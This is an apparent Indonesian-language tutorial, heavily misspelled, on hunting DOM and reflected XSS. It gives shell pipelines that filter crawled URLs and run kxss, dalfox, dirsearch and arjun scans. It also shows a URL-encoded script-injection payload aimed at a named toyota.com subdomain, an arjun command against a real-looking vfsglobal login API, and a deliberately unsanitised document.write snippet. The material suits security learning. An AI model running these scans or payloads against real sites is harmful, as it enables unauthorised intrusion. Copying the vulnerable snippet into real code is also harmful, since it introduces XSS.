## DOM XSS

setalh kita melakukan subdomain enumeration,uls crawler,tahap selanjutnya adalh mencari entry point yang punya refleksi input user ke output HTML/JS

```bash
# Buat folde
mkdir xss

# Ambil parameter only
cat urls | grep "?" > xss/params.txt

# BUANG ASSET (biar gak noise)
grep -Ev "\.(js|css|png|jpg|jpeg|gif|svg|woff|woff2|ico)" xss/params.txt > xss/filtered.txt

# AMBIL KANDIDAT XSS BERDASARKAN KEYWORD
grep -Ei "search|query|id|page|redirect|url|dest|next|return|q|keyword" xss/filtered.txt > xss/xss_candidates.txt


# CEK REFLECTION
cat xss/xss_candidates.txt | kxss > xss/reflected.txt
## Bersihkan reflected karen hasil kxss ini tidak bisa langugn di pake
cat xss/reflected.txt | sed 's/^URL: //' | sort -u > clean.txt

# XSS ANALYSIS (FULL SCAN)
dalfox file xss/clean.txt -o xss/Vulnerable_XSS.txt
```

Misalkan kita menemukan bahwa ada subdomain yang rentan, sebut saja sub.toyota.com, jadi mari kita cari tahu apa yang terjadi.

Saat saya mengakses URL yang rentan [ https://sub.toyota.com/direcrory/?dir=%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3C%2Fscript%3E ] saya mendapatkan pesan pop-up. 

Saya mencari responsnya dan menemukan bahwa parameter yang rentan ada di URL[`source`] yang terdapat dalam berbagai variabel JavaScript seperti `"var returnUrl=", "var applicationUri="` . Anda dapat melihat kode JavaScript ini untuk memahami idenya. 

```html
<script>
  // Assuming the URL is http://test.com?param=test
  var urlParams = new URLSearchParams(window.location.search);
  var paramValue = urlParams.get('param');
  
  // This will execute the script tag in the paramValue variable
  document.write(paramValue)
</script>
// If you look at the code, You will see that the value added to the parameter without any sanitization.
```


## Mencari Reflected XSS

Misalkan kita menemukan endpoint yang sangat menarik https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php . 

Saat saya mengakses URL utama, saya menerima kesalahan 403 Forbidden . 


Kita bisa melakukan fuzzing pada URL dasar dan endpoint lainnya

```bash
dirsearch -u https://tst2.dev.targets.com/ -w wordlist.txt -e php,cgi,htm,html,shtm,shtml,js,txt --random-agent 
# (-u) untuk target && (-w) untuk daftar kata kustom yang akan digunakan dengan alat && (-e) ekstensi berbeda yang akan digunakan dengan alat && (--random-agent) untuk mengubah agen pengguna untuk permintaan 
```

JIka tida menemkn ap apa,kita bisa lanjjt untu mencari Endpoint tersembuyi degna ekstnei ParamMiner atau tools Arjun

```bash
arjun -u https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php -m GET -w Parameters_Fuzz.txt 
# (-u) untuk target kita && (-m GET) mengirim permintaan menggunakan metode GET && (-w) untuk daftar kata khusus yang akan digunakan dengan alat ini 

# Atau
arjun -u "https://vfsvt.vfsglobal.com/app/api/v2/auth/login"
```

Setelah menmun endpitn tersembunyi,kita bis lanjut degn dalfox untuk menemukan reflected nya seprti ini

```bash
dalfox url https://tst2.dev.targets.com/cgi-bin/fr.cfg/php/custom/id-pass.php?auth_status=testing  --skip-xss-scanning -o XSS_Ref.txt
```
